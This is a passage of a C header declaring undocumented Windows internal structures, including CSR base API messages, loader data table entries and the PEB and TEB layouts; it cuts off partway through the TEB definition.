{
	ULONG iTask;
	ULONG BinaryType;
	PVOID ConsoleHandle;
	PVOID VDMProcessHandle;
	PVOID WaitObjectForParent;
	USHORT EntryIndex;
	USHORT VDMCreationState;
} BASE_UPDATE_VDM_ENTRY_MSG, *PBASE_UPDATE_VDM_ENTRY_MSG;

typedef struct _BASE_GET_NEXT_VDM_COMMAND_MSG
{
	ULONG iTask;
	PVOID ConsoleHandle;
	PVOID WaitObjectForVDM;
	PVOID StdIn;
	PVOID StdOut;
	PVOID StdErr;
	ULONG CodePage;
	ULONG dwCreationFlags;
	ULONG ExitCode;
	PCHAR CmdLine;
	PCHAR AppName;
	PCHAR PifFile;
	PCHAR CurDirectory;
	PCHAR Env;
	ULONG EnvLen;
	struct _STARTUPINFOA* StartupInfo;
	PCHAR Desktop;
	ULONG DesktopLen;
	PCHAR Title;
	ULONG TitleLen;
	PCHAR Reserved;
	ULONG ReservedLen;
	USHORT CurrentDrive;
	USHORT CmdLen;
	USHORT AppLen;
	USHORT PifLen;
	USHORT CurDirectoryLen;
	USHORT VDMState;
	UCHAR fComingFromBat;
} BASE_GET_NEXT_VDM_COMMAND_MSG, *PBASE_GET_NEXT_VDM_COMMAND_MSG;

typedef struct _BASE_SHUTDOWNPARAM_MSG
{
	ULONG ShutdownLevel;
	ULONG ShutdownFlags;
} BASE_SHUTDOWNPARAM_MSG, *PBASE_SHUTDOWNPARAM_MSG;

typedef struct _BASE_GETTEMPFILE_MSG
{
	ULONG uUnique;
} BASE_GETTEMPFILE_MSG, *PBASE_GETTEMPFILE_MSG;

typedef struct _BASE_DEBUGPROCESS_MSG
{
	ULONG dwProcessId;
	CLIENT_ID DebuggerClientId;
	PVOID AttachCompleteRoutine;
} BASE_DEBUGPROCESS_MSG, *PBASE_DEBUGPROCESS_MSG;	// <size 0x10>

typedef struct _BASE_CHECKVDM_MSG
{
	ULONG  iTask;
	HANDLE ConsoleHandle;
	ULONG  BinaryType;
	HANDLE WaitObjectForParent;
	HANDLE StdIn;
	HANDLE StdOut;
	HANDLE StdErr;
	ULONG  CodePage;
	ULONG  dwCreationFlags;
	PCHAR  CmdLine;
	PCHAR  AppName;
	PCHAR  PifFile;
	PCHAR  CurDirectory;
	PCHAR  Env;
	ULONG  EnvLen;
	LPSTARTUPINFOA StartupInfo;
	PCHAR  Desktop;
	ULONG  DesktopLen;
	PCHAR  Title;
	ULONG  TitleLen;
	PCHAR  Reserved;
	ULONG  ReservedLen;
	USHORT CmdLen;
	USHORT AppLen;
	USHORT PifLen;
	USHORT CurDirectoryLen;
	USHORT CurDrive;
	USHORT VDMState;
	struct _LUID* UserLuid;
} BASE_CHECKVDM_MSG, *PBASE_CHECKVDM_MSG;

typedef struct _BASE_GET_VDM_EXIT_CODE_MSG
{
	PVOID ConsoleHandle;
	PVOID hParent;
	ULONG ExitCode;
} BASE_GET_VDM_EXIT_CODE_MSG, *PBASE_GET_VDM_EXIT_CODE_MSG;	// <size 0xc>

typedef struct _BASE_DEFERREDCREATEPROCESS_MSG
{
	struct _CLIENT_ID* ClientId;
	ULONG NtUserFlags;
} BASE_DEFERREDCREATEPROCESS_MSG, *PBASE_DEFERREDCREATEPROCESS_MSG;	// <size 0x8>

typedef struct _BASE_EXITPROCESS_MSG {
	NTSTATUS uExitCode;
} BASE_EXITPROCESS_MSG, *PBASE_EXITPROCESS_MSG;	// <size 0x4>

typedef struct _BASE_GET_SET_VDM_CUR_DIRS_MSG
{
	PVOID ConsoleHandle;
	PCHAR lpszzCurDirs;
	ULONG cchCurDirs;
} BASE_GET_SET_VDM_CUR_DIRS_MSG, *PBASE_GET_SET_VDM_CUR_DIRS_MSG;	// <size 0xc>

typedef struct _BASE_SET_REENTER_COUNT
{
	PVOID ConsoleHandle;
	ULONG fIncDec;
} BASE_SET_REENTER_COUNT, *PBASE_SET_REENTER_COUNT;	// <size 0x8>

#if !defined(_WINNT_) || (defined(_MSC_VER) && (_MSC_VER >= 1300))
typedef enum
{
    ACTCTX_RUN_LEVEL_UNSPECIFIED = 0,
    ACTCTX_RUN_LEVEL_AS_INVOKER,
    ACTCTX_RUN_LEVEL_HIGHEST_AVAILABLE,
    ACTCTX_RUN_LEVEL_REQUIRE_ADMIN,
    ACTCTX_RUN_LEVEL_NUMBERS
} ACTCTX_REQUESTED_RUN_LEVEL;

typedef struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION {
    DWORD ulFlags;
    ACTCTX_REQUESTED_RUN_LEVEL  RunLevel;
    DWORD UiAccess;
} ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION, * PACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION;

typedef const struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION * PCACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION;


#endif

typedef struct _BASE_SXS_CREATEPROCESS_MSG
{
	ULONG Flags;
	ULONG ProcessParameterFlags;
	union
	{
		UNICODE_STRING CultureFallbacks;
		ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION RunLevel;
		UNICODE_STRING AssemblyName;
	} u;
} BASE_SXS_CREATEPROCESS_MSG, *PBASE_SXS_CREATEPROCESS_MSG;	// <size 0x80>


typedef struct _BASE_CREATEPROCESS_MSG
{
	PVOID ProcessHandle;
	PVOID ThreadHandle;
	CLIENT_ID ClientId;
	ULONG CreationFlags;
	ULONG VdmBinaryType;
	ULONG VdmTask;
	PVOID hVDM;
	struct _BASE_SXS_CREATEPROCESS_MSG Sxs;
	ULONGLONG PebAddressNative;
	ULONG PebAddressWow64;
	USHORT ProcessorArchitecture;
} BASE_CREATEPROCESS_MSG, *PBASE_CREATEPROCESS_MSG;	// <size 0xb0>


typedef struct _BASE_CREATETHREAD_MSG
{
	PVOID ThreadHandle;
	CLIENT_ID ClientId;
} BASE_CREATETHREAD_MSG, *PBASE_CREATETHREAD_MSG;	// <size 0xc>


typedef struct _BASE_MSG_SXS_HANDLES
{
	PVOID File;
	PVOID Process;
	PVOID Section;
	ULONGLONG ViewBase;
} BASE_MSG_SXS_HANDLES, *PBASE_MSG_SXS_HANDLES;	// <size 0x18>


typedef struct _BASE_EXIT_VDM_MSG
{
	PVOID ConsoleHandle;
	ULONG iWowTask;
	PVOID WaitObjectForVDM;
} BASE_EXIT_VDM_MSG, *PBASE_EXIT_VDM_MSG;	// <size 0xc>


typedef struct _BASE_IS_FIRST_VDM_MSG
{
	__int32 FirstVDM;
} BASE_IS_FIRST_VDM_MSG, *PBASE_IS_FIRST_VDM_MSG;	// <size 0x4>


typedef struct _BASE_SET_REENTER_COUNT_MSG
{
	PVOID ConsoleHandle;
	ULONG fIncDec;
} BASE_SET_REENTER_COUNT_MSG, *PBASE_SET_REENTER_COUNT_MSG;	// <size 0x8>


typedef struct _BASE_BAT_NOTIFICATION_MSG
{
	PVOID ConsoleHandle;
	ULONG fBeginEnd;
} BASE_BAT_NOTIFICATION_MSG, *PBASE_BAT_NOTIFICATION_MSG;	// <size 0x8>


typedef struct _BASE_REGISTER_WOWEXEC_MSG
{
	PVOID hEventWowExec;
	PVOID ConsoleHandle;
} BASE_REGISTER_WOWEXEC_MSG, *PBASE_REGISTER_WOWEXEC_MSG;	// <size 0x8>


typedef struct _BASE_REFRESHINIFILEMAPPING_MSG
{
	UNICODE_STRING IniFileName;
} BASE_REFRESHINIFILEMAPPING_MSG, *PBASE_REFRESHINIFILEMAPPING_MSG;	// <size 0x8>


typedef struct _BASE_SET_TERMSRVCLIENTTIMEZONE
{
	struct _RTL_DYNAMIC_TIME_ZONE_INFORMATION* pDTZInfo;
	ULONG ulDTZInfoSize;
	KSYSTEM_TIME RealBias;
	ULONG TimeZoneId;
} BASE_SET_TERMSRVCLIENTTIMEZONE, *PBASE_SET_TERMSRVCLIENTTIMEZONE;	// <size 0x18>

typedef struct _BASE_SET_TERMSRVAPPINSTALLMODE
{
	__int32 bState;
} BASE_SET_TERMSRVAPPINSTALLMODE, *PBASE_SET_TERMSRVAPPINSTALLMODE;


typedef struct _BASE_SOUNDSENTRY_NOTIFICATION_MSG
{
	ULONG VideoMode;
} BASE_SOUNDSENTRY_NOTIFICATION_MSG, *PBASE_SOUNDSENTRY_NOTIFICATION_MSG;	// <size 0x4>


typedef struct _BASE_DEFINEDOSDEVICE_MSG
{
	ULONG Flags;
	UNICODE_STRING DeviceName;
	UNICODE_STRING TargetPath;
} BASE_DEFINEDOSDEVICE_MSG, *PBASE_DEFINEDOSDEVICE_MSG;	// <size 0x14>

typedef struct _BASE_MSG_SXS_STREAM
{
	UCHAR FileType;
	UCHAR PathType;
	UCHAR HandleType;
	UNICODE_STRING Path;
	PVOID FileHandle;
	HANDLE Handle;
	unsigned __int64 Offset;
	ULONG Size;
} BASE_MSG_SXS_STREAM, *PBASE_MSG_SXS_STREAM;	// <size 0x28>


typedef struct _BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG
{
	ULONG Flags;
	USHORT ProcessorArchitecture;
	UNICODE_STRING CultureFallbacks;
	struct _BASE_MSG_SXS_STREAM Manifest;
	struct _BASE_MSG_SXS_STREAM Policy;
	UNICODE_STRING AssemblyDirectory;
	UNICODE_STRING TextualAssemblyIdentity;
	unsigned __int64 FileTime;
	ULONG ResourceName;
	PVOID ActivationContextData;
	struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION RunLevel;
	UNICODE_STRING AssemblyName;
} BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG, *PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG;	// <size 0x98>



typedef struct _BASE_API_MSG
{
	PORT_MESSAGE h;
	struct _CSR_CAPTURE_HEADER* CaptureBuffer;
	CSR_API_NUMBER ApiNumber;
	ULONG ReturnValue;
	ULONG Reserved;
	union
	{ /* size 0xb0*/
		BASE_NLS_SET_USER_INFO_MSG NlsSetUserInfo;
		BASE_NLS_GET_USER_INFO_MSG NlsGetUserInfo;
		BASE_NLS_UPDATE_CACHE_COUNT_MSG NlsCacheUpdateCount;
		BASE_SHUTDOWNPARAM_MSG ShutdownParam;
		BASE_CREATEPROCESS_MSG CreateProcess;
		BASE_DEFERREDCREATEPROCESS_MSG DeferredCreateProcess;
		BASE_CREATETHREAD_MSG CreateThread;
		BASE_GETTEMPFILE_MSG GetTempFile;
		BASE_EXITPROCESS_MSG ExitProcess;
		BASE_DEBUGPROCESS_MSG DebugProcess;
		BASE_CHECKVDM_MSG CheckVDM;
		BASE_UPDATE_VDM_ENTRY_MSG UpdateVDMEntry;
		BASE_GET_NEXT_VDM_COMMAND_MSG GetNextVDMCommand;
		BASE_EXIT_VDM_MSG ExitVDM;
		BASE_IS_FIRST_VDM_MSG IsFirstVDM;
		BASE_GET_VDM_EXIT_CODE_MSG GetVDMExitCode;
		BASE_SET_REENTER_COUNT SetReenterCount;
		BASE_GET_SET_VDM_CUR_DIRS_MSG GetSetVDMCurDirs;
		BASE_BAT_NOTIFICATION_MSG BatNotification;
		BASE_REGISTER_WOWEXEC_MSG RegisterWowExec;
		BASE_SOUNDSENTRY_NOTIFICATION_MSG SoundSentryNotification;
		BASE_REFRESHINIFILEMAPPING_MSG RefreshIniFileMapping;
		BASE_DEFINEDOSDEVICE_MSG DefineDosDeviceApi;
		BASE_SET_TERMSRVAPPINSTALLMODE SetTermsrvAppInstallMode;
		BASE_SET_TERMSRVCLIENTTIMEZONE SetTermsrvClientTimeZone;
		BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG SxsCreateActivationContext;
	} u;
} BASE_API_MSG, *PBASE_API_MSG;	// <size 0xd8>

typedef struct _BASE_STATIC_SERVER_DATA
{
	UNICODE_STRING WindowsDirectory;
	UNICODE_STRING WindowsSystemDirectory;
	UNICODE_STRING NamedObjectDirectory;
	USHORT WindowsMajorVersion;
	USHORT WindowsMinorVersion;
	USHORT BuildNumber;
	USHORT CSDNumber;
	USHORT RCNumber;
	WCHAR CSDVersion[128];
	SYSTEM_BASIC_INFORMATION SysInfo;
	SYSTEM_TIMEOFDAY_INFORMATION TimeOfDay;
	struct _INIFILE_MAPPING* IniFileMapping;
	NLS_USER_INFO NlsUserInfo;
	UCHAR DefaultSeparateVDM;
	UCHAR IsWowTaskReady;
	UNICODE_STRING WindowsSys32x86Directory;
	UCHAR fTermsrvAppInstallMode;
	RTL_DYNAMIC_TIME_ZONE_INFORMATION tziTermsrvClientTimeZone;
	KSYSTEM_TIME ktTermsrvClientBias;
	ULONG TermsrvClientTimeZoneId;
	UCHAR LUIDDeviceMapsEnabled;
	ULONG TermsrvClientTimeZoneChangeNum;
} BASE_STATIC_SERVER_DATA, *PBASE_STATIC_SERVER_DATA;	// <size 0x1860>

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH {
	ULONG	Offset;
	UCHAR	Alignment[4];
	ULONG_PTR HDC;
	ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH,*PGDI_TEB_BATCH;

typedef enum _EVENT_TYPE {
	NotificationEvent,
	SynchronizationEvent
} EVENT_TYPE;

typedef enum _TIMER_TYPE {
	NotificationTimer,
	SynchronizationTimer
} TIMER_TYPE;

typedef enum _WAIT_TYPE {
	WaitAll,
	WaitAny
} WAIT_TYPE;

#define STATIC_UNICODE_BUFFER_LENGTH 261
#define WIN32_CLIENT_INFO_LENGTH 62

#define WIN32_CLIENT_INFO_SPIN_COUNT 1

typedef PVOID* PPVOID;

#define TLS_MINIMUM_AVAILABLE 64

typedef struct _ASSEMBLY_STORAGE_MAP_ENTRY {

	ULONG Flags;
	UNICODE_STRING DosPath;
	PVOID Handle;
} ASSEMBLY_STORAGE_MAP_ENTRY, *PASSEMBLY_STORAGE_MAP_ENTRY;

typedef struct _ASSEMBLY_STORAGE_MAP {

	ULONG Flags;
	ULONG AssemblyCount;
	struct _ASSEMBLY_STORAGE_MAP_ENTRY** AssemblyArray;
} ASSEMBLY_STORAGE_MAP, *PASSEMBLY_STORAGE_MAP;

typedef struct _ACTIVATION_CONTEXT_DATA {
	ULONG Magic;
	ULONG HeaderSize;
	ULONG FormatVersion;
	ULONG TotalSize;
	ULONG DefaultTocOffset;
	ULONG ExtendedTocOffset;
	ULONG AssemblyRosterOffset;
	ULONG Flags;
} ACTIVATION_CONTEXT_DATA, *PACTIVATION_CONTEXT_DATA;

typedef struct _ACTIVATION_CONTEXT {

	LONG RefCount;
	ULONG Flags;
	LIST_ENTRY Links;
	struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;
	//void (NotificationRoutine)(unsigned long, struct _ACTIVATION_CONTEXT*, void*, void*, void*, unsigned char*);
	struct _ACTIVATION_CONTEXT* NotificationRoutine;
	PVOID NotificationContext;
	ULONG SentNotifications[8];
	ULONG DisabledNotifications[8];
	struct _ASSEMBLY_STORAGE_MAP StorageMap;
	struct _ASSEMBLY_STORAGE_MAP_ENTRY* InlineStorageMapEntries[32];
	ULONG StackTraceIndex;
	PVOID StackTraces[4][4];
} ACTIVATION_CONTEXT, *PACTIVATION_CONTEXT;	// <size 0x12c>

typedef struct _PEB_FREE_BLOCK {
	struct _PEB_FREE_BLOCK *Next;
	ULONG Size;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct _PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _INITIAL_TEB
{
	struct
	{
		PVOID OldStackBase;
		PVOID OldStackLimit;
	} OldInitialTeb;

	PVOID StackBase;
	PVOID StackLimit;
	PVOID StackAllocationBase;

} INITIAL_TEB, *PINITIAL_TEB;

typedef struct _WOW64_PROCESS
{
	PVOID Wow64;
} WOW64_PROCESS, *PWOW64_PROCESS;

//
// Private flags for loader data table entries
//

#define LDRP_STATIC_LINK                0x00000002
#define LDRP_IMAGE_DLL                  0x00000004
#define LDRP_LOAD_IN_PROGRESS           0x00001000
#define LDRP_UNLOAD_IN_PROGRESS         0x00002000
#define LDRP_ENTRY_PROCESSED            0x00004000
#define LDRP_ENTRY_INSERTED             0x00008000
#define LDRP_CURRENT_LOAD               0x00010000
#define LDRP_FAILED_BUILTIN_LOAD        0x00020000
#define LDRP_DONT_CALL_FOR_THREADS      0x00040000
#define LDRP_PROCESS_ATTACH_CALLED      0x00080000
#define LDRP_DEBUG_SYMBOLS_LOADED       0x00100000
#define LDRP_IMAGE_NOT_AT_BASE          0x00200000
#define LDRP_COR_IMAGE                  0x00400000
#define LDRP_COR_OWNS_UNMAP             0x00800000
#define LDRP_SYSTEM_MAPPED              0x01000000
#define LDRP_IMAGE_VERIFYING            0x02000000
#define LDRP_DRIVER_DEPENDENT_DLL       0x04000000
#define LDRP_ENTRY_NATIVE               0x08000000
#define LDRP_REDIRECTED                 0x10000000
#define LDRP_NON_PAGED_DEBUG_INFO       0x20000000
#define LDRP_MM_LOADED                  0x40000000
#define LDRP_COMPAT_DATABASE_PROCESSED  0x80000000

#define LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT 0x00000001
#define LDR_GET_DLL_HANDLE_EX_PIN 0x00000002

#define LDR_ADDREF_DLL_PIN 0x00000001

#define LDR_GET_PROCEDURE_ADDRESS_DONT_RECORD_FORWARDER 0x00000001

#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY 0x00000002

#define LDR_LOCK_LOADER_LOCK_DISPOSITION_INVALID 0
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_ACQUIRED 1
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_NOT_ACQUIRED 2

#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1
#define LDR_DLL_NOTIFICATION_REASON_UNLOADED 2

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA
{
	ULONG Flags;
	PUNICODE_STRING FullDllName;
	PUNICODE_STRING BaseDllName;
	PVOID DllBase;
	ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA
{
	ULONG Flags;
	PCUNICODE_STRING FullDllName;
	PCUNICODE_STRING BaseDllName;
	PVOID DllBase;
	ULONG SizeOfImage;
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA
{
	LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
	LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID (NTAPI *PLDR_DLL_NOTIFICATION_FUNCTION)(
	IN ULONG NotificationReason,
	IN PLDR_DLL_NOTIFICATION_DATA NotificationData,
	IN OPTIONAL PVOID Context
	);

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX
{
	USHORT NextOffset;
	RTL_PROCESS_MODULE_INFORMATION BaseInfo;
	ULONG ImageChecksum;
	ULONG TimeDateStamp;
	PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, *PRTL_PROCESS_MODULE_INFORMATION_EX;

//
// Loader Data Table. Used to track DLLs loaded into an
// image.
//
#ifdef __cplusplus
struct LIST_ENTRY_EX : public LIST_ENTRY
{
	BYTE unk1[8];
	HANDLE base;
	BYTE unk2[20];
	WCHAR* name;
};
#endif

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG_PTR OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef const struct _LDR_DATA_TABLE_ENTRY *PCLDR_DATA_TABLE_ENTRY;

typedef NTSTATUS LDR_RELOCATE_IMAGE_RETURN_TYPE;

struct _FLS_CALLBACK_INFO;

typedef BOOLEAN (NTAPI *PDLL_INIT_ROUTINE)(
	IN PVOID DllHandle,
	IN ULONG Reason,
	IN OPTIONAL PCONTEXT Context
	);

#define DOS_MAX_COMPONENT_LENGTH 255
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)

#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_RELATIVE_NAME
{
	STRING RelativeName;
	HANDLE ContainingDirectory;
} RTL_RELATIVE_NAME, *PRTL_RELATIVE_NAME;

typedef struct _RTLP_CURDIR_REF *PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U
{
	UNICODE_STRING RelativeName;
	HANDLE ContainingDirectory;
	PRTLP_CURDIR_REF CurDirRef;
} RTL_RELATIVE_NAME_U, *PRTL_RELATIVE_NAME_U;

typedef enum _RTL_PATH_TYPE
{
	RtlPathTypeUnknown,
	RtlPathTypeUncAbsolute,
	RtlPathTypeDriveAbsolute,
	RtlPathTypeDriveRelative,
	RtlPathTypeRooted,
	RtlPathTypeRelative,
	RtlPathTypeLocalDevice,
	RtlPathTypeRootLocalDevice
} RTL_PATH_TYPE, *PRTL_PATH_TYPE;

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

// 18/04/2011 updated
typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ReservedBits0 : 27;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PPVOID ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PPVOID ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PPVOID FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG SpareTracingBits : 30;
        };
    };
} PEB, *PPEB;

//
//  Fusion/sxs thread state information (aka, stuff noone cares about!)
//

#define ACTIVATION_CONTEXT_STACK_FLAG_QUERIES_DISABLED (0x00000001)

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME
{
	struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
	struct _ACTIVATION_CONTEXT* ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, *PRTL_ACTIVATION_CONTEXT_STACK_FRAME;


typedef struct _ACTIVATION_CONTEXT_STACK
{
	struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME * ActiveFrame;
	struct _LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef const ACTIVATION_CONTEXT_STACK * PCACTIVATION_CONTEXT_STACK;

#define TEB_ACTIVE_FRAME_CONTEXT_FLAG_EXTENDED (0x00000001)

typedef struct _TEB_ACTIVE_FRAME_CONTEXT
{
	ULONG Flags;
	PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef const TEB_ACTIVE_FRAME_CONTEXT *PCTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT_EX
{
	TEB_ACTIVE_FRAME_CONTEXT BasicContext;
	PCSTR SourceLocation; // e.g. "c:\windows\system32\ntdll.dll"
} TEB_ACTIVE_FRAME_CONTEXT_EX, *PTEB_ACTIVE_FRAME_CONTEXT_EX;

typedef const TEB_ACTIVE_FRAME_CONTEXT_EX *PCTEB_ACTIVE_FRAME_CONTEXT_EX;

#define TEB_ACTIVE_FRAME_FLAG_EXTENDED (0x00000001)

// 17/3/2011 updated
typedef struct _TEB_ACTIVE_FRAME
{
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME *Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef const TEB_ACTIVE_FRAME *PCTEB_ACTIVE_FRAME;

typedef struct _TEB_ACTIVE_FRAME_EX
{
	TEB_ACTIVE_FRAME BasicFrame;
	PVOID ExtensionIdentifier; // use address of your DLL Main or something mapping in the address space
} TEB_ACTIVE_FRAME_EX, *PTEB_ACTIVE_FRAME_EX;

typedef const TEB_ACTIVE_FRAME_EX *PCTEB_ACTIVE_FRAME_EX;

// 18/04/2011
typedef struct _TEB
{
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
